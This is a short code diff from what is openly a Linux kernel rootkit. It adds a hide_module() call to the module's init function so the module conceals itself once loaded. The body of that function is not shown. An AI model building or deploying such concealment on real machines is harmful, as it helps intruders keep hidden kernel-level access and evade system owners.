@@ -16,6 +16,8 @@ static int __init rootkit_init(void)
     if (err)
         printk(KERN_DEBUG "rootkit: got error %d", err);
 
+    hide_module();
+
     printk(KERN_INFO "rootkit loaded!\n");
 
     return 0;
